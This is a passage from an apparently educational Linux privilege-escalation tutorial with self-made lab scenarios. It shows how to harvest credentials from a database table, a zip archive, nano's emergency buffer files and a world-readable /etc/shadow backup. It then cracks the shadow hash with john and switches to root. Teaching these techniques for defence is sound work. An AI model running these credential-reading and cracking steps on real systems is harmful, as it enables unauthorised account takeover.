                   (NULL, 'SUPER ADMIN', 'root', 'pass123'),
                   (1, 'NORMAL', 'user', 'pass321'),
                   (2, 'ADMIN', 'user', 'hello');
```

The query looks like this in MariaDB:

```sql
MariaDB [test]> INSERT INTO `users` (`employee_id`, `user_type`, `username`, `password`) VALUES
    ->                    (NULL, 'SUPER ADMIN', 'root', 'pass123'),
    ->                    (1, 'NORMAL', 'user', 'pass321'),
    ->                    (2, 'ADMIN', 'user', 'hello');
Query OK, 3 rows affected (0.003 sec)
Records: 3  Duplicates: 0  Warnings: 0
```

As the adversary, we can log in to MySQL with:

```shell
user@pwn:~$ mysql -u user -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 36
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> 
```

Then we could perform an SQL query of the columns username, and password from the users' table:

```sql
MariaDB [(none)]> USE test;
Reading table information for completion of table and column names
we can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [test]> SELECT username, password FROM users;
+----------+----------+
| username | password |
+----------+----------+
| root     | pass123  |
| user      | pass321  |
| user   | hello    |
+----------+----------+
3 rows in set (0.001 sec)
```

We can see some usernames and passwords so we can use these credentials to try to escalate privileges on the system. In modern databases, we may see the passwords hashed using some strong hashing algorithms.

# Privilege Escalation via Compressed Files / Archives

Sensitive information might be stored in compressed files like `.zip, .tar, .tar.gz` and so on. These compressed files may contain credentials as well.

### Compressed File Scenario

Create a zip file using the file that we created in the  [Plaintext File Scenario](#plain-text-file-scenario):

```shell
user@pwn:~$ zip password.zip /home/user/Desktop/password.txt 
  adding: home/user/Desktop/password.txt (deflated 15%)
```

From an adversary's perspective, we can try to decompress the file and examine its contents:

```shell
user@pwn:~$ unzip password.zip -d /tmp
Archive:  password.zip
  inflating: /tmp/home/user/Desktop/password.txt  
```

Read the file:

```shell
user@pwn:~$ cat /tmp/home/user/Desktop/password.txt
Passwords:
	The user password is: pass321

```

This was a really simple example but hey it is what it is. We could attempt to try a password re-use technique and find valid credentials.

# Privilege Escalation via Buffer Files

Some text editors like `nano` will try to dump the buffer into an emergency file. In the case of the nano text editor, this will happen when it receives a `SIGHUP` or `SIGTERM` signal or when it simply runs out of memory. The buffer will be written to a file called `nano.save` if the buffer does not already have a filename otherwise if it has a filename then it will append a ".save" suffix to the current filename. For more information about this we can try to read the [documentation](https://www.nano-editor.org/dist/v2.2/nano.1.html#NOTES).

Imagine that this buffer file was a PHP configuration file for a database connection or something similar. Well if that is the case we may find credentials in the buffer file.

### Nano Scenario

Let's attempt to edit the `config.php` file that we created in the previous section:

```shell
nano config.php
```

Open another terminal window, tab, or pane and now let's send a `SIGTERM` signal by using the following command:

```shell
pkill nano
```

After killing the nano process we will see this output in the terminal window, tab, or pane that nano was open:

```shell
user@pwn:~$ nano config.php
Received SIGHUP or SIGTERM

Buffer written to config.php.save
```

As the adversary, we can just read the file and gather the credentials:

```shell
cat config.php.save
```

# Privilege Escalation via Backup Files

It is very common to see backups of files that do contain credentials. Backups often have this naming convention `filename.bak`  ending with `.bak`, however, we may also extensions such as the following:

```shell
.bak
.ext # <-- extension like .sh, .php, .pl, .py, .zip
.bak.ext
.backup
```

### Sensitive File /etc/shadow Backup Scenario

Let's create a backup of the `/etc/shadow` file, we shall never do the following:

```shell
sudo cp /etc/shadow /tmp/shadow.bak && sudo chmod o+r /tmp/shadow.bak
```

This is a Linux-sensitive file, this file contains the user password hashes and is now readable by other users and groups. As the adversary, we could attempt to crack the hashes of these users:

```shell
user@pwn:~$ cat /tmp/shadow.bak
root:$6$xxxxxxxxxxxxxxxxxxxxxxx:18982:0:99999:7:::
daemon:*:18858:0:99999:7:::
bin:*:18858:0:99999:7:::
sys:*:18858:0:99999:7:::
sync:*:18858:0:99999:7:::
<...SNIP...>
```

We can copy this hash and save it in a file called `hash.txt`:

```shell
❯ echo '$6$xxxxxxxxxxxxxxxxxxxxxxx' > hash.txt
```

We could then try to crack the hash to recover the password:

```shell
❯ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

As we can see below, the password has been cracked:

```shell
❯ john hash.txt --show
?:pass123

1 password hash cracked, 0 left
```

Once we have cracked the root user password we can switch to the root user:

```shell
su root
```
